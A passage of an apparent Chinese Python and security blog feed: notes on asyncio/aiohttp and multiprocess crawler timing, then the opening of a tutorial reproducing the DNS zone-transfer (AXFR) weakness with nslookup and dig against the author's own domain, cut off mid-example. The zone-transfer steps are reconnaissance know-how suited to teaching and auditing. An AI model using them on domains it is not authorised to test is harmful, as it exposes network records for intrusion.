class="line">7</span><br></pre></td><td class="code"><pre><span class="line">开始第 1 个任务</span><br><span class="line">开始第 2 个任务</span><br><span class="line">开始第 3 个任务</span><br><span class="line">第 1 个任务执行了 1 秒</span><br><span class="line">第 2 个任务执行了 2 秒</span><br><span class="line">第 3 个任务执行了 3 秒</span><br><span class="line">所有总共耗时 3.0029773712158203</span><br></pre></td></tr></table></figure><p>这里运行了三个任务，三个任务的执行时间加在一起是6秒，但是最后总共耗时是3秒，接下来就看看协程在爬虫中的使用。</p><h1 id="0x02-aiohttp的使用"><a href="#0x02-aiohttp的使用" class="headerlink" title="0x02 aiohttp的使用"></a>0x02 aiohttp的使用</h1><p>使用 aiohttp 模块可以将 requests 替换成一个异步的 requests ，下面先来看看一般的 requests 的使用，下面的运行结果耗时是我运行了三次，然后取平均数的结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normal</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        r = requests.get(URL)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">t1 = time.time()</span><br><span class="line">URL = <span class="string">'https://www.teamssix.com/'</span></span><br><span class="line">    normal()</span><br><span class="line">    print(<span class="string">"正常访问 3 次博客耗费时间"</span>, time.time()-t1)</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><pre><code>正常访问 3 次博客耗费时间 12.872265259424845</code></pre><p>正常情况下，花费了近 13 秒，接下来使用 aiohttp 看看耗时多少。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(session)</span>:</span></span><br><span class="line">   response = <span class="keyword">await</span> session.get(<span class="string">'https://www.teamssix.com/'</span>)       <span class="comment"># 等待并切换</span></span><br><span class="line">   <span class="keyword">return</span> str(response.url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop)</span>:</span></span><br><span class="line">   <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:      <span class="comment"># 官网推荐建立 Session 的形式</span></span><br><span class="line">       tasks = [loop.create_task(job(session)) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)]</span><br><span class="line">       finished, unfinished = <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">t1 = time.time()</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main(loop))</span><br><span class="line">loop.close()</span><br><span class="line">print(<span class="string">"异步访问 3 次博客耗费时间"</span>, time.time() - t1)</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">异步访问 3 次博客耗费时间 4.055158615112305</span><br></pre></td></tr></table></figure><p>从运行结果上来看使用 aiohttp 还是很给力的，接下来，看看多线程运行的时间。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_test</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.get(URL)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    URL = <span class="string">'https://www.teamssix.com/'</span></span><br><span class="line">    thread_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        t = threading.Thread(target=thread_test)</span><br><span class="line">        thread_list.append(t)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> thread_list:</span><br><span class="line">        i.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> thread_list:</span><br><span class="line">        i.join()</span><br><span class="line">    print(<span class="string">"多线程访问 3 次博客耗费时间"</span>, time.time()-t1)</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5.449431339899699</span><br></pre></td></tr></table></figure><p>可以看到 aiohttp 的速度还是要略快于多线程的，这里只是简单介绍了一下 aiohttp ，详细的可以参阅<a href="https://docs.python.org/zh-cn/3/library/asyncio.html" target="_blank" rel="noopener">官方文档</a>，想要使用的熟练还是需要大量练习，任重道远。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>参考文章：<br><a href="https://www.jianshu.com/p/b5e347b3a17c" target="_blank" rel="noopener">https://www.jianshu.com/p/b5e347b3a17c</a><br><a href="https://segmentfault.com/a/1190000008814676" target="_blank" rel="noopener">https://segmentfault.com/a/1190000008814676</a><br><a href="https://www.lylinux.net/article/2019/6/9/57.html" target="_blank" rel="noopener">https://www.lylinux.net/article/2019/6/9/57.html</a><br><a href="https://morvanzhou.github.io/tutorials/data-manipulation/scraping/4-02-asyncio/" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/data-manipulation/scraping/4-02-asyncio/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;之前对协程早有耳闻，但一直没有去学习，今天就来学习一下协程，再次感谢莫烦的教程。&lt;/p&gt;
&lt;p&gt;可以交给asyncio执行的任务被称为协程， asyncio 即异步的意思，在 Python3 中这是一个仅使用单线程就能达到多线程、多进程效果的工具。&lt;/p&gt;
&lt;p&gt;在单线程中使用异步发起 IO 操作的时候，不需要等待 IO 的结束，在等待 IO 操作结束的这个空当儿可以继续做其他事情，结束的时候就会得到通知，所以能够很有效的利用等待下载的这段时间。&lt;/p&gt;
&lt;p&gt;今天就来看看协程能不能干掉多线程和多进程。&lt;/p&gt;
    
    </summary>
    
      <category term="Python 其他相关笔记" scheme="https://www.teamssix.com/categories/Python-%E5%85%B6%E4%BB%96%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="协程" scheme="https://www.teamssix.com/tags/%E5%8D%8F%E7%A8%8B/"/>
    
      <category term="异步IO" scheme="https://www.teamssix.com/tags/%E5%BC%82%E6%AD%A5IO/"/>
    
  </entry>
  
  <entry>
    <title>【Python 学习笔记】多进程爬虫</title>
    <link href="https://www.teamssix.com/year/191220-161533.html"/>
    <id>https://www.teamssix.com/year/191220-161533.html</id>
    <published>2019-12-20T08:15:33.000Z</published>
    <updated>2019-12-24T02:32:19.642Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前段时间学习了多线程，但在实际的情况中对于多线程的速度实在不满意，所以今天就来学学多进程分布式爬虫，在这里感谢莫烦的Python教程。</p><h1 id="0x01-什么是多进程爬虫"><a href="#0x01-什么是多进程爬虫" class="headerlink" title="0x01 什么是多进程爬虫"></a>0x01 什么是多进程爬虫</h1><p>在讲述多进程之前，先来回顾一下之前学习的多线程。</p><a id="more"></a><p>对于多线程可以简单的理解成运输快递的货车，虽然在整个运输快递的途中有很多货车参与运输，但快递到你手中的时间并不会因为货车的数量增加而变化多少，甚至可能会因为参与运输的货车数量过多，导致送货时间变慢，因为货物在不断的上货卸货。<br>当然现实中可不会有人这么干，然而在计算机的世界里，有时却会犯这种错误，这也就是说多线程并不是越多越好。</p><p>如果有操作系统的基础，则对于线程与进程的理解会更深刻些，这里继续参照上面的例子，对于线程可以简单的理解成一个线程就是一个货车，而一个进程则是一整条快递运输线路上的货车集合，也就是说一个进程包含了多个线程。</p><p>如果在只有一个快递需要运输的时候，使用线程与进程的区别或许不大，但是如果有十件快递、百件快递，使用多进程无疑能够极大的提高效率。</p><h1 id="0x02-准备工作"><a href="#0x02-准备工作" class="headerlink" title="0x02 准备工作"></a>0x02 准备工作</h1><p>在开始学习多进程之前，先来理一下爬虫思路，这里拿爬取我的博客文章举例，首先先用 requests 访问 temassix.com，之后利用 BeautifulSoup 解析出我博客中的文章链接，接着再利用 requests 访问文章，便完成了一个简单的爬虫。</p><p>接下来需要用到的模块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time    <span class="comment">#测试爬取时间</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process   <span class="comment">#多进程模块</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br></pre></td></tr></table></figure><p>接下来需要用到的一些子函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req_url</span><span class="params">(url)</span>:</span></span><br><span class="line">    r = requests.get(url)    <span class="comment">#访问url</span></span><br><span class="line">    <span class="keyword">return</span>(r.text)    <span class="comment">#返回html</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">soup_url</span><span class="params">(html)</span>:</span></span><br><span class="line">url_list = []</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'html.parser'</span>)    <span class="comment">#解析返回的html</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> soup.select(<span class="string">'.post-title'</span>):</span><br><span class="line">url_list.append(<span class="string">'https://www.teamssix.com&#123;&#125;'</span>.format(i[<span class="string">'href'</span>]))    <span class="comment">#拼接博客文章的url</span></span><br><span class="line"><span class="keyword">return</span> (url_list)    <span class="comment">#返回博客文章url数组</span></span><br></pre></td></tr></table></figure><h1 id="0x03-测试普通爬取方法"><a href="#0x03-测试普通爬取方法" class="headerlink" title="0x03 测试普通爬取方法"></a>0x03 测试普通爬取方法</h1><p>这里先使用普通爬取的方法，也就是单线程测试一下，为了方便，下面提到的单线程处理方法，准确的来说是单进程单线程，同样的，下面提到的多进程准确的说法是多进程单线程，多线程准确的说则是单进程多线程。</p><p>值得注意的是爬取耗时根据自己的网络情况而定，即使碰到多进程耗时几百秒而单线程耗时几十秒也是正常的，这种情况是因为网络环境较差造成的，所以碰到结果出入很大的时候，可以多试几次，排除偶然性，下面就来上代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment"># 开始单线程</span></span><br><span class="line">start_time = time.time()</span><br><span class="line">url = <span class="string">'https://www.teamssix.com'</span></span><br><span class="line">html = req_url(url)</span><br><span class="line">home_page = soup_url(html)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> home_page:</span><br><span class="line">req_url(i)</span><br><span class="line">end_time = time.time()</span><br><span class="line">print(<span class="string">'\n单线程：'</span>,end_time - start_time)</span><br></pre></td></tr></table></figure><p>最终运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">单线程： 29.181440114974976</span><br></pre></td></tr></table></figure><p>单线程花费了 29 秒的时间，接下来使用多进程测试一下</p><h1 id="0x04-测试多进程爬取方法"><a href="#0x04-测试多进程爬取方法" class="headerlink" title="0x04 测试多进程爬取方法"></a>0x04 测试多进程爬取方法</h1><p>通过学习发现多进程的用法和多线程还是挺相似的，所以就直接放代码吧，感兴趣的可以看看参考文章。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment"># 开始多进程</span></span><br><span class="line">start_time = time.time()</span><br><span class="line">url = <span class="string">'https://www.teamssix.com'</span></span><br><span class="line">pool = Pool(<span class="number">4</span>)</span><br><span class="line">home_page = soup_url(req_url(url))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> home_page:</span><br><span class="line">pool.apply_async(req_url, args=(i,))</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br><span class="line">end_time = time.time()</span><br><span class="line">print(<span class="string">'\n多进程：'</span>,end_time - start_time)</span><br></pre></td></tr></table></figure><p>最终运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">多进程： 12.674117088317871</span><br></pre></td></tr></table></figure><p>多进程仅用了 12 秒就完成了任务，经过多次测试，发现使用多进程基本上能比单线程快2倍以上。</p><p>为了看到多线程与多进程的差距，这里使用多线程处理了一下上面的操作，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment">#开始多线程</span></span><br><span class="line">start_time = time.time()</span><br><span class="line">url = <span class="string">'https://www.teamssix.com'</span></span><br><span class="line">thread_list = []</span><br><span class="line">home_page = soup_url(req_url(url))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> home_page:</span><br><span class="line">t = threading.Thread(target = req_url, args=(i,))</span><br><span class="line">thread_list.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> thread_list:</span><br><span class="line">i.start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> thread_list:</span><br><span class="line">i.join()</span><br><span class="line">end_time = time.time()</span><br><span class="line">print(<span class="string">'\n多线程：'</span>, end_time - start_time)</span><br></pre></td></tr></table></figure><p>最终运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">多线程： 11.685778141021729</span><br></pre></td></tr></table></figure><p>看到这里可能会觉着，这多线程和多进程爬虫的时间也差不多呀，然而事实并非那么简单。</p><p>由于爬虫的大多数时间都耗在了请求等待响应中，所以在爬虫的时候使用多线程好像快了不少，但我以前写过一个笔记：<a href="https://www.teamssix.com/year/191104-101112.html">不一定有效率GIL</a><br>在这篇文章里演示了如果使用单线程和多线程处理密集计算任务，有时多线程反而会比单线程慢了不少，所以接下来就看看多进程处理密集计算任务的表现。</p><h1 id="0x05-处理密集计算任务耗时对比"><a href="#0x05-处理密集计算任务耗时对比" class="headerlink" title="0x05 处理密集计算任务耗时对比"></a>0x05 处理密集计算任务耗时对比</h1><p>直接上代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time  <span class="comment"># 测试爬取时间</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">math</span><span class="params">(i)</span>:</span></span><br><span class="line">result2 = <span class="number">2</span> ** i    <span class="comment">#执行幂运算</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment">#开始单线程</span></span><br><span class="line">start_time = time.time()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">1000000001</span>, <span class="number">250000000</span>):</span><br><span class="line">math(i)</span><br><span class="line">end_time = time.time()</span><br><span class="line">print(<span class="string">'\n单线程：'</span>,end_time - start_time)</span><br><span class="line"></span><br><span class="line"><span class="comment">#开始多进程</span></span><br><span class="line">start_time = time.time()</span><br><span class="line">pool = Pool(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">1000000001</span>, <span class="number">250000000</span>):</span><br><span class="line">pool.apply_async(math, args=(i,))</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br><span class="line">end_time = time.time()</span><br><span class="line">print(<span class="string">'\n多进程：'</span>,end_time - start_time)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始多线程</span></span><br><span class="line">start_time = time.time()</span><br><span class="line">thread_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">1000000001</span>, <span class="number">250000000</span>):</span><br><span class="line">t = threading.Thread(target = math, args=(i,))</span><br><span class="line">thread_list.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> thread_list:</span><br><span class="line">i.start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> thread_list:</span><br><span class="line">i.join()</span><br><span class="line">end_time = time.time()</span><br><span class="line">print(<span class="string">'\n多线程：'</span>, end_time - start_time)</span><br></pre></td></tr></table></figure><p>最终运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">单线程： 20.495169162750244</span><br><span class="line"></span><br><span class="line">多进程： 11.645867347717285</span><br><span class="line"></span><br><span class="line">多线程： 22.07299304008484</span><br></pre></td></tr></table></figure><p>通过运行结果可以很明显看出，单线程与多线程的耗时差距不大，但是多进程的耗时与之相比几乎快了一倍，所以平时为了提高效率是使用多线程还是多进程，也就很清楚了。</p><p>但如果平时想提高爬虫效率是用多线程还是多进程呢？毕竟他们效率都差不多，那么协程了解一下🧐</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>参考文章：<br><a href="https://morvanzhou.github.io/tutorials/data-manipulation/scraping/4-01-distributed-scraping/" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/data-manipulation/scraping/4-01-distributed-scraping/</a><br><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017628290184064" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/1016959663602400/1017628290184064</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;前段时间学习了多线程，但在实际的情况中对于多线程的速度实在不满意，所以今天就来学学多进程分布式爬虫，在这里感谢莫烦的Python教程。&lt;/p&gt;
&lt;h1 id=&quot;0x01-什么是多进程爬虫&quot;&gt;&lt;a href=&quot;#0x01-什么是多进程爬虫&quot; class=&quot;headerlink&quot; title=&quot;0x01 什么是多进程爬虫&quot;&gt;&lt;/a&gt;0x01 什么是多进程爬虫&lt;/h1&gt;&lt;p&gt;在讲述多进程之前，先来回顾一下之前学习的多线程。&lt;/p&gt;
    
    </summary>
    
      <category term="Python 其他相关笔记" scheme="https://www.teamssix.com/categories/Python-%E5%85%B6%E4%BB%96%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="多进程" scheme="https://www.teamssix.com/tags/%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
    
      <category term="分布式" scheme="https://www.teamssix.com/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞复现】DNS域传送漏洞</title>
    <link href="https://www.teamssix.com/year/191206-172901.html"/>
    <id>https://www.teamssix.com/year/191206-172901.html</id>
    <published>2019-12-06T09:29:01.000Z</published>
    <updated>2019-12-06T09:40:28.088Z</updated>
    
    <content type="html"><![CDATA[<p>注：本文中使用的域名是不存在DNS域传送漏洞的，本文仅用作技术交流学习用途，严禁将该文内容用于违法行为。</p><a id="more"></a><h1 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h1><p>DNS: 网域名称系统（英文：Domain Name System，缩写：DNS）是互联网的一项服务。</p><p>它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。</p><p>DNS使用TCP和UDP端口53，当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><p>常用的DNS记录有以下几类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">主机记录(A记录)：</span><br><span class="line">A记录是用于名称解析的重要记录，它将特定的主机名映射到对应主机的IP地址上。</span><br><span class="line"></span><br><span class="line">IPv6主机记录(AAAA记录)：</span><br><span class="line">与A记录对应，用于将特定的主机名映射到一个主机的IPv6地址。 </span><br><span class="line"></span><br><span class="line">别名(CNAME记录)：</span><br><span class="line">CNAME记录用于将某个别名指向到某个A记录上，这样就不需要再为某个新名字另外创建一条新的A记录。</span><br><span class="line"></span><br><span class="line">电子邮件交换记录（MX记录)：</span><br><span class="line">记录一个邮件域名对应的IP地址</span><br><span class="line"></span><br><span class="line">域名服务器记录 (NS记录)：</span><br><span class="line">记录该域名由哪台域名服务器解析</span><br><span class="line"></span><br><span class="line">反向记录(PTR记录):</span><br><span class="line">也即从IP地址到域名的一条记录</span><br><span class="line"></span><br><span class="line">TXT记录：</span><br><span class="line">记录域名的相关文本信息</span><br></pre></td></tr></table></figure><p>DNS服务器分为主服务器，备份服务器，缓存服务器。</p><p>备份服务器需要利用“域传送”从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，万一主服务器挂了还有备份服务器顶着。</p><p>而“域传送”漏洞则是由于dns配置不当，本来只有备份服务器能获得主服务器的数据，由于漏洞导致任意client都能通过“域传送”获得主服务器的数据（zone数据库信息）。</p><p>这样，攻击者就能获得某个域的所有记录，甚至整个网络拓扑都暴露无遗，凭借这份网络蓝图，攻击者可以节省很多扫描时间以及信息收集的时间，还提升了准确度等等。</p><p>大的互联网厂商通常将内部网络与外部互联网隔离开，一个重要的手段是使用 Private DNS。如果内部 DNS 泄露，将造成极大的安全风险。风险控制不当甚至造成整个内部网络沦陷。</p><h1 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h1><h2 id="1、Windows下使用nslookup"><a href="#1、Windows下使用nslookup" class="headerlink" title="1、Windows下使用nslookup"></a>1、Windows下使用nslookup</h2><p>nslookup命令以两种方式运行：非交互式和交互式。</p><p>1、非交互式模式下，查看对应主机域的域名服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~# nslookup -type=ns teamssix.com</span><br><span class="line"></span><br><span class="line">服务器:  ns-gg.online.ny.cn</span><br><span class="line">Address:  118.192.13.5</span><br><span class="line">非权威应答:</span><br><span class="line">teamssix.com    nameserver = clint.ns.cloudflare.com</span><br><span class="line">teamssix.com    nameserver = isla.ns.cloudflare.com</span><br></pre></td></tr></table></figure><p>2、进入交互模式，指定域名服务器，列出域名信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">~# nslookup</span><br><span class="line"></span><br><span class="line">默认服务器:  ns-gg.online.ny.cn</span><br><span class="line">Address:  118.192.13.5</span><br><span class="line"></span><br><span class="line">&gt; server clint.ns.cloudflare.com</span><br><span class="line"></span><br><span class="line">默认服务器:  clint.ns.cloudflare.com</span><br><span class="line">Addresses:  2400:cb00:2049:1::adf5:3b5a</span><br><span class="line">          2606:4700:58::adf5:3b5a</span><br><span class="line">          173.245.59.90</span><br><span class="line"></span><br><span class="line">&gt; ls teamssix.com</span><br><span class="line"></span><br><span class="line">ls: connect: No such file or directory</span><br><span class="line">*** 无法列出域 teamssix.com: Unspecified error</span><br><span class="line">DNS 服务器拒绝将区域 teamssix.com 传送到你的计算机。如果这不正确，</span><br><span class="line">请检查 IP 地址 2400:cb00:2049:1::adf5:3b5a 的 DNS 服务器上 teamssix.com 的</span><br><span class="line">区域传送安全设置。</span><br></pre></td></tr></table></figure><p>如果提示无法列出域，那就说明此域名不存在域传送漏洞。</p><h2 id="2、Kali下使用dig、dnsenum、dnswalk"><a href="#2、Kali下使用dig、dnsenum、dnswalk" class="headerlink" title="2、Kali下使用dig、dnsenum、dnswalk"></a>2、Kali下使用dig、dnsenum、dnswalk</h2><h3 id="a、dig"><a href="#a、dig" class="headerlink" title="a、dig"></a>a、dig</h3><p>这里涉及dig 一个重要的命令axfr，axfr 是q-type类型的一种，axfr类型是Authoritative Transfer的缩写，指请求传送某个区域的全部记录。</p><p>我们只要欺骗dns服务器发送一个axfr请求过去，如果该dns服务器上存在该漏洞，就会返回所有的解析记录值。</p><p>dig的整体利用步骤基本和nslookup一致。</p><p>1、查看对应主机域的域名服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 